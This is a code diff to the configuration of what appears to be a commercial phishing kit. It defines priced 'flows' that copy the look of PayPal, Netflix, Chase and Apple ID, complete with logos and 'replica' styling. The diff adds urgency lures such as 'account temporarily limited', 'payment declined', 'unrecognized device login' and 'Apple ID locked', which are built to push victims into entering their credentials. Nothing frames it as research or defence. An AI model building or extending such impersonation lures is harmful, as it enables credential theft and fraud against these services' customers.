@@ -45,15 +45,25 @@ export interface FlowTheme {
     };
 }
 
+export interface UrgencyConfig {
+    type: 'limitation' | 'payment_decline' | 'suspicious_activity' | 'locked';
+    title: string;
+    message: string;
+    buttonText: string;
+    alertIcon: string;
+    referencePrefix: string;
+}
+
 export interface FlowConfig {
     id: string;
     name: string;
     category: 'payments' | 'streaming' | 'banking' | 'ecommerce' | 'tech';
-    icon: string;           // Emoji or icon class for Admin UI
-    color: string;          // Brand primary color for Admin UI
-    monthlyPrice: number;   // Price in USD
+    icon: string;
+    color: string;
+    monthlyPrice: number;
     description: string;
-    theme: FlowTheme;       // Theming configuration
+    theme: FlowTheme;
+    urgency: UrgencyConfig; // Scenarios
     steps: FlowStep[];
     popular?: boolean;
 }
@@ -85,6 +95,14 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         monthlyPrice: 0,
         description: 'Payment verification flow',
         popular: true,
+        urgency: {
+            type: 'limitation',
+            title: 'Your account has been temporarily limited',
+            message: 'We noticed some unusual activity on your account. To protect your financial security, we have limited certain features until you verify your identity.',
+            buttonText: 'Secure My Account',
+            alertIcon: 'gpp_maybe',
+            referencePrefix: 'PP'
+        },
         theme: {
             mode: 'light',
             background: { type: 'color', value: '#F5F7FA' },
@@ -138,6 +156,14 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         color: '#e50914',
         monthlyPrice: 10,
         description: 'Streaming account verification',
+        urgency: {
+            type: 'payment_decline',
+            title: 'Update your payment method',
+            message: 'We could not process your last payment. Please update your payment details to continue watching.',
+            buttonText: 'Update Payment',
+            alertIcon: 'credit_card_off',
+            referencePrefix: 'NFLX'
+        },
         theme: {
             mode: 'dark',
             background: { type: 'image', value: 'url("assets/bg/netflix-bg.jpg")' },
@@ -190,6 +216,14 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         monthlyPrice: 25,
         description: 'Chase banking verification',
         popular: true,
+        urgency: {
+            type: 'suspicious_activity',
+            title: 'Action Required: Verify your identity',
+            message: 'We noticed a login attempt from an unrecognized device. Please verify your identity to secure your account.',
+            buttonText: 'Verify Identity',
+            alertIcon: 'verified_user',
+            referencePrefix: 'CHASE'
+        },
         theme: {
             mode: 'light',
             background: { type: 'image', value: 'url("assets/bg/chase-bg.jpg")' },
@@ -242,6 +276,14 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         color: '#a2aaad',
         monthlyPrice: 20,
         description: 'Apple ID verification',
+        urgency: {
+            type: 'locked',
+            title: 'This Apple ID has been locked for security reasons',
+            message: 'You must verify your identity to unlock your account.',
+            buttonText: 'Unlock Account',
+            alertIcon: 'lock',
+            referencePrefix: 'ID'
+        },
         theme: {
             mode: 'light',
             background: { type: 'color', value: '#ffffff' },
@@ -263,7 +305,7 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
                 labelBehavior: 'top'
             },
             button: {
-                background: 'linear-gradient(to right, #40cbe2, #0071e3)', // Just example, Apple doesn't use gradient button usually but for "replica" visuals
+                background: 'linear-gradient(to right, #40cbe2, #0071e3)',
                 color: '#ffffff',
                 borderRadius: '12px',
                 width: 'full',
@@ -271,7 +313,7 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             },
             header: {
                 logoUrl: 'assets/logos/apple.png',
-                logoHeight: '80px', // Bigger centered icon
+                logoHeight: '80px',
                 alignment: 'center'
             },
             footer: {
@@ -296,7 +338,7 @@ export const FLOW_CATEGORIES = {
     tech: { label: 'Tech', icon: '💻' }
 };
 
-// Helper functions
+// Helper functions (same as before)
 export function getFlowById(id: string): FlowConfig | undefined {
     return AVAILABLE_FLOWS.find(f => f.id === id);
 }
